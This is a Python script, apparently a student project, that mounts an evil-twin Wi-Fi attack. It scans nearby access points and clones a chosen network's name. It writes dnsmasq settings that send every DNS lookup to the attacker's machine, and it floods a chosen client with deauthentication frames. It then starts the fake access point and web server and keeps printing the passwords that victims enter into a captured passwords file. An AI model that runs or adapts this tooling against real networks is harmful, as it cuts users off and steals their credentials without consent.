#!/usr/bin/env python

import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11, RadioTap, Dot11Deauth
import os
import time

# A list of anyone that is connected to the AP
clients_list = {}

# A list of all AP names scanned
ap_names_scanned = {}

# A list of all AP MACs scanned
ap_mac_scanned = {}

# The desired AP to attack (MAC address)
ap_to_attack = ""


def filter_packets(pkt):
    global ap_mac_scanned
    if pkt.type == 0 and pkt.subtype == 8:
	if pkt.addr2 not in ap_mac_scanned:
	    ap_mac_scanned[pkt.addr2] = pkt.addr2
	    ap_names_scanned[pkt.addr2] = pkt.info
	    print(len(ap_mac_scanned), '     %s     %s ' % (pkt.addr2, pkt.info))


def users_connected_to_AP(pkt):
    global clients_list
    clients_list = {}
    client = pkt[Dot11].addr3
    if ap_to_attack == client and not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeReq) and not pkt.haslayer(Dot11ProbeResp):
        if str(pkt.summary()) not in clients_list:
            clients_list[str(pkt.summary())] = True
            print(pkt.summary())


def main():
# code to switch to monitor mode
    os.system('iwconfig')
    networkCard = raw_input("Enter the name of the network card you want to switch to monitor mode: \n")
    os.system('sudo ifconfig ' + networkCard + ' down')
    os.system('sudo iwconfig ' + networkCard + ' mode monitor')
    os.system('sudo ifconfig ' + networkCard + ' up')
    os.system('iwconfig')
    print("Scanning for access points, please wait... or press CTRL+C to stop scanning")
    print("index         MAC            SSID")
    sniff(iface=networkCard, prn=filter_packets)

# Choose access point to attack
    global ap_to_attack
    global ssid_name
    if len(ap_mac_scanned) > 0:
        mac_adder = raw_input('Please enter the BSSID address (mac-address) to attack: ')
        ap_to_attack = ap_mac_scanned[mac_adder]
        ssid_name = ap_names_scanned[mac_adder]
        print("AP_to_attack = " + ap_to_attack + " , ssid_name = " + ssid_name)

#dynamic changes to hostapd.conf, dnsmasq.conf, startAP.sh files according to the AP they want to attack

#dynamicaly changing hostapd.conf
        filename = "/root/matala/hostapd.conf"
        text = str("#Set wifi interface\n" + 
        "interface=" + networkCard + "\n" +
        "#Set network name\n" + 
        "ssid=" + ssid_name + "\n" + 
        "#Set channel\n" + 
        "channel=1\n" + 
        "#Set driver\n" + 
        "driver=nl80211")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()

#dynamicaly changing dnsmasq.conf
        filename = "/root/matala/dnsmasq.conf"
        text = str("#Set the wifi interface\n" + 
        "interface=" + networkCard + "\n" +
        "#Configure ip range for clients for 8 hours\n" + 
        "dhcp-range=10.0.0.10, 10.0.0.100,8h\n" + 
        "#Set the gateway IP address\n" + 
        "dhcp-option=3,10.0.0.1\n" + 
        "#Set dns server address\n" + 
        "dhcp-option=6,10.0.0.1\n" + 
        "#Redirect all requests to 192.168.1.2\n" + 
        "address=/#/10.0.0.1\n")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()

#dynamicaly changing startAP.sh
        filename = "/root/matala/startAP.sh"
        text = str("#!/bin/sh\n" +
	"airmon-ng check kill\n"
        "ifconfig " + networkCard + " 10.0.0.1 netmask 255.255.255.0\n" +
        "route add default gw 10.0.0.1\n" +
        "echo 1 > /proc/sys/net/ipv4/ip_forward\n" +
        "iptables --flush\n" +
        "iptables --table nat --flush\n" +
        "iptables --delete-chain\n" +
        "iptables --table nat --delete-chain\n" +
        "iptables -P FORWARD ACCEPT\n" +
        "dnsmasq -C /root/matala/dnsmasq.conf\n" +
        "hostapd /root/matala/hostapd.conf -B\n" +
        "service apache2 start\n")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()


        print("checking for clients connected to this AP. press CTRL+C to stop scanning")
        print ("index       Client MAC")
        try:
            sniff(iface=networkCard, prn=users_connected_to_AP)
        except:
            pass

        user_adder = raw_input(
            "Enter the ssid of the client you want to attack: ")

######
###### here we should start the fake AP. because only one network card works, we start the AP after stoping the deauthentication attack.
###### if we had two network cards we would send the deauth attack in another terminal so we can continue to the rest of the code.

        pkt = RadioTap() / Dot11(addr1=user_adder, addr2=ap_to_attack, addr3=ap_to_attack) / Dot11Deauth()

# sending the deauthentication packet to the mac address we want to attack
        print("Deauthentication attack in progress... press Ctrl C to stop.")
        try:
            while(True):
                sendp(pkt, iface=networkCard, count=10)
        except:
            pass

# start the fake ap
	os.system("./startAP.sh")
        
# detect changes in passwords file, and print an alert.
        try:
            while True:
                os.system("clear")
                print("Waiting for passwords from users... press Ctrl C to stop")
                os.system("cat /var/www/html/passwords.txt")
                time.sleep(0.5)
        except:
            pass

# stop the attack.
        os.system("./stopAP.sh")

main()
